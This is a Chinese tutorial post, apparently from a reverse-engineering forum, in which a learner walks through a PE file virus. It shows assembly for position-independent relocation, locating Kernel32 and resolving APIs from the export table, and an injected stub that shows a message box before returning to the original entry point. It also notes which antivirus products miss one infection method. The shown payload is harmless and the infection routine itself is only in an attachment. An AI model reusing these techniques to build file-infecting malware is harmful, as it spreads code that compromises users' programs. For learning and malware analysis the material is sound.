
# PE 文件病毒初探

> 原文：[`www.pediy.com/kssd/pediy12/137291.html`](https://www.pediy.com/kssd/pediy12/137291.html)

【文章标题】: PE 文件病毒初探  
【文章作者】: loongzyd  
【下载地址】: 见附件  
【使用工具】: `RadAsm` `Peid`  
【参考】: 《加密与解密》第三版，《计算机病毒分析与防治简明教程》  

PE 格式大致温习一下之后开始按照教材上的进度进入 PE 文件病毒的学习，程序实现了"添加节方式修改 PE","加长最后一节修改 PE","插入节方式修改 PE"三种方式。感染之后只是在程序运行正常功能之前谈出一个对话框，在没有经过处理的情况下，被感染的 `.exe` 文件都被 360 报毒，小红伞对第三种方式感染的 `.exe` 文件没有报毒。  

我们先来看看程序感染之前的情况: 第一种方式感染之后的情况:  

![](img/3276cb13f482c12b048f72a7fb415ba0.jpg) ![](img/a2c90bcd10d7a8f9d02f2078c5270eab.jpg)  

第二种方式感染之后的情况: 第三种方式感染之后的情况:  

![](img/8a66d5dd9c4d75e834b756a15456154d.jpg) ![](img/cc59ee0c3554d05f0ca3848e2d09c19e.jpg)  

程序的流程:  

![](img/d1beb8002fe4cf241882385b5552eec0.jpg)  

感染之后运行情况:  

![](img/83150070c44c176284fc794c2aad9982.jpg)  

### 重定位

代码:

```
Call @F
  @@:
  pop ebx
  sub ebx,offset @B
```

因为代码是插入别的文件当中，所处的地址一般是不一样的，所以为了保证在别的地址也能完成相同功能，需要采用重定位技术。其实就是找到两次代码所在地址的差，在代码调用的时候将整个差加上。  

### 查找 Kernel32.dll 基地址

代码:

```
GetKernelBase proc _dwKernelRet:DWORD
  LOCAL @dwReturn:DWORD
  
  pushad
  mov @dwReturn,0
  
;********************************************************************
;查找 Kernel32.dll 的基地址
;********************************************************************
  mov edi,_dwKernelRet
  and edi,0ffff0000h
  .while TRUE
    .if word ptr [edi] == IMAGE_DOS_SIGNATURE
      mov esi,edi
      add esi,[esi+003ch]                 ;e_lfanew 字段的偏移为 3c
      .if word ptr [esi] == IMAGE_NT_SIGNATURE
        mov @dwReturn,edi
        .break
      .endif
    .endif
    _PageError:
    sub edi,01000h
    .break .if edi < 07000000h
  .endw
  popad
  mov eax,@dwReturn
  ret

_GetKernelBase endp
```

在 Windows 系统下，`Kernel32.dll` 的加载基地址都是按照 `0x1000` 对齐，从程序入口处的 `esp` 获取一个 `DWORD` 型的值 `[esp]`，整个值在 `Kernel32.dll` 模块中，这样顺着该值由高地址往低地址搜寻就能找到 `Kernel32.dll` 基地址。  

### 查找 API 地址

代码:

```
GetApi proc _hModule:DWORD,_lpszApi:DWORD
  
  local @dwReturn:DWORD
  LOCAL @dwStringLength:DWORD                 ;需要查找地址的 API 函数的长度
  
  pushad
  mov @dwReturn,0
;********************************************************************
;重定位
;********************************************************************
  Call @F
  @@:
  pop ebx
  sub ebx,offset @B
  
;********************************************************************
;计算 API 字符串的长度(包含'\0')
;********************************************************************
  mov edi,_lpszApi
  mov ecx,-1
  xor al,al
  cld                      ;设置方向标志 DF=0,地址递增
  repnz scasb
  mov ecx,edi
  sub ecx,_lpszApi
  mov @dwStringLength,ecx
  
;********************************************************************
;导出表
;********************************************************************
  mov esi,_hModule
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
  add esi,_hModule
  assume esi:ptr IMAGE_EXPORT_DIRECTORY
  
;********************************************************************
;寻找符合名称的导出函数名
;********************************************************************
  mov ebx,[esi].AddressOfNames
  add ebx,_hModule
  xor edx,edx
  .repeat
    push esi
    mov edi,[ebx]                    ;获取一个指向导出函数的 API 函数名称的 RVA
    add edi,_hModule                 ;加上基地址
    mov esi,_lpszApi                 ;esi 指向需要查找的 API 函数名称
    mov ecx,@dwStringLength          ;需要寻找的 API 函数的名称长度
    repz cmpsb                      ;导出 API 函数名与需要查找的函数名进行逐位比较
    .if ZERO?
      pop esi                  ;如果匹配
      jmp @F
    .endif
    pop esi
    add ebx,4                        ;指向下一个 API 函数名的 RVA
    inc edx                        ;计数加一
  .until edx >= [esi].NumberOfNames              ;如果所有的函数名已经都进行过匹配，则说明需要查找的函数不在 Kernel32.dll 里面
  jmp _Error
@@:                        ;ebx 指向了导出表中需要查找的函数名的地址
;********************************************************************
;API 名称索引 --> 序号索引 -->地址索引
;********************************************************************
  sub ebx,_hModule            ;减去 Kernel32 基地址
  sub ebx,[esi].AddressOfNames    ;减去 AddressOfNames 字段的 RVA，得到的值为 API 名称索引*4(DWORD)
  shr ebx,1                   ;除以 2(AddressOfNameOrdinals 的序号为 WORD)
  add ebx,[esi].AddressOfNameOrdinals  ;加上 AddressOfNameOrdinals 字段的 RVA
  add ebx,_hModule            ;加上 Kernel32 基地址
  movzx eax, word ptr [ebx]    ;得到该 API 的序号
  shl eax,2                   ;乘以 4(地址为 DWORD 型)
  add eax,[esi].AddressOfFunctions  ;加上 AddressOfFunctions 字段的 RVA
  add eax,_hModule            ;加上 Kernel32 的基地址，此时 eax 指向的就是需要查找的函数名的地址
  mov eax,[eax]
  add eax,_hModule
  mov @dwReturn,eax
_Error:
  assume esi:nothing
  popad
  mov eax,@dwReturn
  ret

_GetApi endp
```

### 弹框的主要实现

代码:

```
Call @F
  @@:
  pop ebx
  sub ebx,@B
  invoke _GetKernelBase,[esp]                     ;获取 Kernel32.dll 的基地址
  .if !eax
    jmp _ToOldEntry
  .endif
  mov [ebx+DllKernel32],eax                       ;存放 Kernel32.dll 的基地址
  lea eax,[ebx+szGetProcAddress]
  invoke _GetApi,[ebx+DllKernel32],eax            ;获取 GetProcAddress 地址
  .if !eax
    jmp _ToOldEntry
  .endif
  mov [ebx+_GetProcAddress],eax                   ;存放 GetProcAddress 函数的地址
  lea eax,[ebx+szLoadLibrary]
  invoke [ebx+_GetProcAddress],[ebx+DllKernel32],eax ;获取 LoadLibrary 函数的地址
  mov [ebx+_LoadLibrary],eax                      ;存放 LoadLibrary 函数的地址
  lea eax,[ebx+szUser32]
  invoke [ebx+_LoadLibrary],eax                   ;加载 User32.dll 的基地址
  mov [ebx+DllUser32],eax                         ;存放 User32.dll 的基地址
  lea eax,[ebx+szMessageBox]
  invoke [ebx+_GetProcAddress],[ebx+DllUser32 ],eax ;获取 MessageBox 函数的地址
  mov [ebx+_MessageBox],eax
;********************************************************************
;测试所用，表示功能已经实现
;********************************************************************
  invoke [ebx+_MessageBox],NULL,addr [ebx+show_text],addr [ebx+show_title],MB_OK     
_ToOldEntry:
  db  0e9h  ;0e9h 是 jmp xxxxxxxx 的机器码
       ;_dwOldEntry=(原来的入口 RVA 地址-jmp xxx 下条指令的 RVA 地址)
_dwOldEntry  dd  44332211h  ;用来填入原来的入口地址
flags    dd  11111111h
```

`flags` 的作用是起到标记作用，表示该 PE 文件已经被感染了（定位到节区的实际代码的结尾处，然后往前移动 4 个字节，读取最后 4 个字节的数据，和 `11111111h` 进行比较）。  

对 PE 文件进行修改的代码请查看附加中完整的程序。  

写的非常菜，希望大牛们不要笑话。  

ps：  

`level1` 的密码: `loong`  

`level2` 的密码: `xp`  

`level3` 的密码: `cuit`  

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) | `Virus_test1.rar` |
